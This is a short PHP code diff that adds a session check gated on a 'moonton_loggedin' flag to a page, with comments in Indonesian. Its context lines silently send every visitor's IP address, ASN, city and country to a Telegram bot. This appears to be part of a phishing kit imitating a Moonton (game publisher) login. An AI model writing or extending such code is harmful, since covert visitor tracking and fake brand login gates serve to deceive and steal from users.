@@ -13,6 +13,20 @@ $country = getCountry($ip);
 sendToTelegram("User accessed page - IP: $ip | ASN: $asn | City: $city | Country: $country");
 
 ?>
+<?php
+session_start();
+include 'includes/config.php';
+include 'includes/functions.php';
+
+// Jika belum login, redirect ke login
+if (!isset($_SESSION['moonton_loggedin'])) {
+    header("Location: login.php?redirect=index.php");
+    exit;
+}
+
+// ... kode yang sudah ada sebelumnya ...
+?>
+    
 <!DOCTYPE html>
 <html lang="en">
 <head>
